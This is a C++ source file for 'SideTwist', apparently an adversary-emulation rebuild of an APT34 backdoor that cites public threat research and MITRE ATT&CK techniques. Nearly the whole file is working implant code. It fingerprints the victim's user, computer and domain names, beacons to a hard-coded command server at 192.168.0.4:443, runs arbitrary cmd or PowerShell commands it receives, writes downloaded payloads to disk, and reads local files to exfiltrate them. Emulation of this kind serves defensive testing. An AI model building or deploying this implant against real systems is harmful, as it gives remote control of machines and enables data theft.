#include "SideTwist.h"

SideTwist::SideTwist(void)
{
	this->setID();
	this->setIPAddress("192.168.0.4");
	this->setPort("443");
}

SideTwist::~SideTwist(void)
{

}

/**
* Sets an ID
*
* As part of the first action every time it is called, SideTwist
* generates an ID to use for communication. ID is 4 bytes and is
* comprised of username, computername, and domain name. The CTI does
* not indicate how these are combined. Selected design includes the
* first two characters of the username, the first character of the
* computer name, and the first character of the domain name.
*
* Default values have been added in the event an API call fails.
*
* CTI: https://research.checkpoint.com/2021/irans-apt34-returns-with-an-updated-arsenal/
*
*/
void SideTwist::setID()
{
	std::string user = SideTwist::getUserName();
	std::string computer = SideTwist::getComputerName();
	std::string domain = SideTwist::getDomainName();

	this->id = user + computer + domain;
}

/**
* Responsible for the main execution of the agent
*
* First creates a comms object to handle network activity and encryption.
* Then, beacons for instructions. Once obtained, parses the command and
* calls the corresponding functions either internally or using the comms
* object to fetch files.
*/

int SideTwist::run()
{
	StComms* commsObj = new StComms(this->id, this->ip_address, this->port);

	// Get the task
	std::vector<std::string>* pTaskFields = new std::vector<std::string>;
	bool bSuccess = commsObj->getTask(pTaskFields);

	if (!bSuccess || pTaskFields->at(0).compare("-1") == 0)
	{
		pTaskFields->clear();
		delete pTaskFields;
		delete commsObj;
		return 0;
	}

	std::string result;
	switch (std::stoi(pTaskFields->at(1)))
	{
	case 101:
	case 104:
		result = this->cmdExec(pTaskFields->at(2));
		break;
	case 102:
		result = this->download(pTaskFields->at(3), pTaskFields->at(2), commsObj);
		break;
	case 103:
		this->getFileBytes(pTaskFields->at(2), result);
		break;
	default:
		result = "Unrecognized command";
	}

	commsObj->postTaskResponse(pTaskFields->at(0), result);

	//cleanup
	pTaskFields->clear();
	delete pTaskFields;
	delete commsObj;

	return 0;
}

/**
* Command Execution functionality.
*
* Commands passed to this function are executed in cmd by default. Do not
* use 'cmd.exe /c ...' as that will not return output to the pipe gathering
* the response. PowerShell commands can be used, supply 'powershell.exe' as
* the first argument. Encoded commands recommended.
*
* @param The command to execute
* @return stdout from executed command
*
* MITRE ATT&CK Technique: T1059.003 - Command and Scripting Interpreter: Windows Command Shell
*/
std::string SideTwist::cmdExec(std::string cmd) {
	std::array<char, 1024> buf;
	std::string output;
	std::string c = cmd + " 2>&1";
	std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(c.c_str(), "r"), _pclose);
	if (!pipe) {
		return "Failed to open pipe";
	}
	while (fgets(buf.data(), buf.size(), pipe.get()) != nullptr) {
		output += buf.data();
	}
	return output;
}

/**
* Handles the download of a file from the server
*
* Currently uses a string object to contain the bytes since the base64 implementation
* uses std::string. The raw bytes can be accessed with the data() function and the size
* function ignores any null bytes in the array. Time permitting, will add modifications
* to the base64 to use a more appropriate type.
*
* @param the file name to grab from the server
* @param the local file path in which to write the contents
* @param a pointer to the comms object to perform network actions
* @return Status message to return to the server (CTI deviation for better testing)
*
* MITRE ATT&CK Technique: T1105 - Ingress Tool Transfer
*/
std::string SideTwist::download(std::string fileName, std::string filePath, StComms* commsObj)
{
	// File bytes as string not ideal but it's used by the selected B64 implementation
	std::string fileBytes;
	bool err = commsObj->downloadFile(fileName, fileBytes);

	if (!err) {
		FILE* pFile;
		errno_t err;
		const char* pByteData = fileBytes.data();
		if ((err = fopen_s(&pFile, filePath.c_str(), "wb")) != 0)
		{
			return "File could not be opened for writing";
		}
		else
		{
			fwrite(pByteData, (size_t)1, fileBytes.size(), pFile);
			fclose(pFile);
		}
	}
	else
	{
		return "Failed to get the file from the server";
	}
	return "File (" + (fileName)+") successfully written to: " + filePath;
}

/**
* Populates the supplied string object with file bytes
*
* std::string was selected due to the Base64 implementation. Time
* permitting, modifications to the Base64 will be made to use a more
* appropriate data type.
*
* @param the file path to upload to the server
* @param the string in which to place the file bytes
*
* MITRE ATT&CK Technique: T1041 - Exfiltration Over C2 Channel
*/
void SideTwist::getFileBytes(std::string filePath, std::string& fileBytes)
{
	std::ifstream input(filePath, std::ios::binary);
	if (input.fail())
	{
		fileBytes.assign("The requested file was not found or could not be read.");
	}
	else
	{
		fileBytes.assign(std::istreambuf_iterator<char>(input),
			std::istreambuf_iterator<char>());
	}
}

/**
*	Sets the IP address for requests
*
*	@param String-form IP address, will be validated
*	@return Success
*/
bool SideTwist::setIPAddress(std::string ip)
{
	this->ip_address = ip;
	return true;
}

/**
*	Sets the port for requests
*
*	@param String-form port, will be converted and validated
*	@return Success
*
* MITRE ATT&CK Technique: T1071.001 - Application Layer Protocol: Web Protocols
*/
bool SideTwist::setPort(std::string port)
{
	try
	{
		int new_port = std::stoi(port);
		if (new_port > 0 && new_port < 65636)
		{
			this->port = new_port;
			return true;
		}
		else
		{
			//printf("The supplied port did not meet standard port requirements.");
			return false;
		}
	}
	catch (const std::exception& e)
	{
		//printf("Error %u converting the port.\n", GetLastError());
		return false;
	}
}

/**
* @return a string representation of the C2 server (address:port)
*/
std::string SideTwist::getAddressAndPort()
{
	std::string address = this->ip_address + ":" + std::to_string(this->port);
	return address;
}

/**
* Get the username portion of the ID
*
* Returns the first two characters of the username. Defaults to
* 'UN' if no username is returned to ensure the ID has 4 bytes.
*
* @return The first two characters of the username or default 'UN'
*
* MITRE ATT&CK Technique: T1033 - System Owner/User Discovery
*/
std::string SideTwist::getUserName()
{
	DWORD size = UNLEN + 1;
	LPWSTR username = new wchar_t[size];
	std::string firstCharacters = "";
	if (GetUserNameW(username, &size))
	{
		std::wstring wUsername(username);
		firstCharacters = std::string(wUsername.begin(), wUsername.end()).substr(0, 2);
	}

	if (firstCharacters.empty()) {
		firstCharacters = "UN";
	}

	delete[] username;
	return firstCharacters;
}

/**
* Get the computer name portion of the ID
*
* Returns the first character of the computer name. Defaults to
* 'C' if no computer name is returned to ensure the ID has 4 bytes.
*
* @return The first character of the computer name or default 'C'
*
* MITRE ATT&CK Technique: T1082 - System Information Discovery
*/
std::string SideTwist::getComputerName()
{
	DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
	LPWSTR computerName = new wchar_t[size];
	std::string firstCharacter = "";
	if (GetComputerNameW(computerName, &size))
	{
		std::wstring wComputerName(computerName);
		firstCharacter = std::string(wComputerName.begin(), wComputerName.end()).substr(0, 1);
	}

	if (firstCharacter.empty()) {
		firstCharacter = "C";
	}

	delete[] computerName;
	return firstCharacter;
}

/**
* Get the domain name portion of the ID
*
* Returns the first character of the domain name. Defaults to
* 'W' if no domain name is returned to ensure the ID has 4 bytes.
*
* @return The first character of the domain name or default 'W'
*
* MITRE ATT&CK Technique: T1082 - System Information Discovery
*/
std::string SideTwist::getDomainName()
{
	DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
	LPWSTR domainName = new wchar_t[size];
	std::string firstCharacter = "";
	if (GetComputerNameExW(ComputerNameDnsDomain, domainName, &size))
	{
		std::wstring wDomainName(domainName);
		firstCharacter = std::string(wDomainName.begin(), wDomainName.end()).substr(0, 1);
	}

	if (firstCharacter.empty())
	{
		firstCharacter = "W";
	}

	delete[] domainName;
	return firstCharacter;
}

/**
* Gets the ID value
*
* CTI: https://research.checkpoint.com/2021/irans-apt34-returns-with-an-updated-arsenal/
*
* @return The generated, 4-byte ID ([US]er[C]omputer[D]omain)
*/
std::string SideTwist::getID()
{
	return this->id;
}
